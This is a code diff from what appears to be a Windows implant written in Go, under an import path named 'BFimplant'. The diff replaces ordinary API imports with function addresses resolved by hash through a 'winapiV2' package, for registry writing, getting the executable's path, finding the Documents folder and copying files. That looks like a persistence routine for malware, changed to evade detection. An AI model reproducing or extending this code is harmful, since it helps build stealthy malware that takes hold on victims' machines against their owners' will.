@@ -4,19 +4,19 @@ import (
 	"syscall"
 	"unsafe"
 	"fmt"
+	"BFimplant/winapiV2"
 
 )
 
 var (
-	modadvapi32          = syscall.NewLazyDLL("advapi32.dll")
-	procRegCreateKeyExW  = modadvapi32.NewProc("RegCreateKeyExW")
-	procRegSetValueExW   = modadvapi32.NewProc("RegSetValueExW")
-	procRegCloseKey      = modadvapi32.NewProc("RegCloseKey")
-	modKernel32           = syscall.NewLazyDLL("kernel32.dll")
+	procRegCreateKeyExW  = winapiV2.GetFunctionAddressbyHash("advapi32", 0xc988e74)
+	procRegSetValueExW   = winapiV2.GetFunctionAddressbyHash("advapi32", 0x2cea05e0)
+	procRegCloseKey      = winapiV2.GetFunctionAddressbyHash("advapi32", 0x7649a602)
+	procGetModuleFileName = winapiV2.GetFunctionAddressbyHash("kernel32", 0x206167c3)
 	modShell32            = syscall.NewLazyDLL("shell32.dll")
-	procGetModuleFileName = modKernel32.NewProc("GetModuleFileNameW")
 	procSHGetFolderPath   = modShell32.NewProc("SHGetFolderPathW")
-	procCopyFile          = modKernel32.NewProc("CopyFileW")
+	// procSHGetFolderPath   = winapiV2.GetFunctionAddressbyHash("shell32", 0x13f66500)
+	procCopyFile          = winapiV2.GetFunctionAddressbyHash("kernel32", 0x39e8f317)
 )
 
 const (
@@ -29,7 +29,7 @@ const (
 func RegCreateKeyEx(key syscall.Handle, subKey string) (syscall.Handle, error) {
 	var result syscall.Handle
 	var disposition uint32
-	ret, _, _ := syscall.SyscallN(procRegCreateKeyExW.Addr(),
+	ret, _, _ := syscall.SyscallN(procRegCreateKeyExW,
 		uintptr(key),
 		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(subKey))),
 		0,
@@ -47,7 +47,7 @@ func RegCreateKeyEx(key syscall.Handle, subKey string) (syscall.Handle, error) {
 }
 
 func RegSetValueEx(key syscall.Handle, valueName string, value string) error {
-	ret, _, _ := syscall.SyscallN(procRegSetValueExW.Addr(),
+	ret, _, _ := syscall.SyscallN(procRegSetValueExW,
 	uintptr(key),
 	uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
 	0,
@@ -63,7 +63,7 @@ func RegSetValueEx(key syscall.Handle, valueName string, value string) error {
 }
 
 func RegCloseKey(key syscall.Handle) error {
-	ret, _, _ := syscall.SyscallN(procRegCloseKey.Addr(),
+	ret, _, _ := syscall.SyscallN(procRegCloseKey,
 		uintptr(key),
 	)
 	if ret != 0 {
@@ -75,8 +75,8 @@ func RegCloseKey(key syscall.Handle) error {
 
 func GetExecutablePath() string {
 	var buf [syscall.MAX_PATH]uint16
-	_,_, err := procGetModuleFileName.Call(0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
-	if err != nil && err.Error() != "The operation completed successfully." {
+	_,_, err := syscall.SyscallN(procGetModuleFileName,0, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
+	if err != 0 && err.Error() != "The operation completed successfully." {
 		fmt.Println("Error getting executable path:", err)
 		return ""
 	}
@@ -85,7 +85,7 @@ func GetExecutablePath() string {
 
 func GetDocumentsPath() string {
 	var buf [syscall.MAX_PATH]uint16
-	hr, _, _ := procSHGetFolderPath.Call(0, csidlPersonal, 0, 0, uintptr(unsafe.Pointer(&buf[0])))
+	hr, _, _ := syscall.SyscallN(procSHGetFolderPath.Addr(), 0, csidlPersonal, 0, 0, uintptr(unsafe.Pointer(&buf[0])))
 	if hr != 0 {
 		fmt.Println("Error getting Documents path:", hr)
 		return ""
@@ -107,7 +107,7 @@ func CopyFile(src, dst string) error {
 	if err != nil {
 		return err
 	}
-	ret, _, err := procCopyFile.Call(uintptr(unsafe.Pointer(srcPtr)), uintptr(unsafe.Pointer(dstPtr)), 0)
+	ret, _, err := syscall.SyscallN(procCopyFile, uintptr(unsafe.Pointer(srcPtr)), uintptr(unsafe.Pointer(dstPtr)), 0)
 	if ret == 0 {
 		return err
 	}
